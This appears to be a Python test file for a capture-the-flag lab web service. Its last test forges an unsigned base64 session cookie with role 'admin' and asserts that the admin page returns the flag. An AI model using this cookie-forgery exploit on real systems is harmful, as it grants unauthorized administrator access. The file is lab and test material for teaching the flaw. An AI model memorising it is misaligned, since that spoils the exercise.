import requests, base64, json, time

BASE = "http://localhost:8082"


def wait_up(timeout=15):
    for _ in range(timeout * 5):
        try:
            if requests.get(f"{BASE}/health", timeout=1).status_code == 200:
                return
        except Exception:
            pass
        time.sleep(0.2)
    raise RuntimeError("Servicio no disponible")


def test_login_alumno():
    wait_up()
    r = requests.post(f"{BASE}/api/login",
                      json={"usuario": "alumno", "password": "alumno123"})
    assert r.status_code == 200
    data = r.json()
    assert "token" in data


def test_token_is_base64_json():
    r = requests.post(f"{BASE}/api/login",
                      json={"usuario": "alumno", "password": "alumno123"})
    token = r.json()["token"]
    decoded = json.loads(base64.b64decode(token).decode())
    assert decoded["rol"] == "user"
    assert decoded["usuario"] == "alumno"


def test_admin_denied_with_user_token():
    s = requests.Session()
    r = s.post(f"{BASE}/api/login",
               json={"usuario": "alumno", "password": "alumno123"})
    s.cookies.set("session_token", r.json()["token"])
    r2 = s.get(f"{BASE}/admin")
    assert r2.status_code == 403


def test_idor_cookie_tampering():
    """Exploit: modificar cookie para rol=admin."""
    s = requests.Session()
    s.post(f"{BASE}/api/login",
           json={"usuario": "alumno", "password": "alumno123"})

    # Construir token falso con rol=admin
    forged_payload = {"usuario": "alumno", "rol": "admin"}
    forged_token = base64.b64encode(json.dumps(forged_payload).encode()).decode()

    s.cookies.set("session_token", forged_token)
    r = s.get(f"{BASE}/admin")
    assert r.status_code == 200
    data = r.json()
    assert "flag" in data
    assert data["flag"].startswith("CTF{")
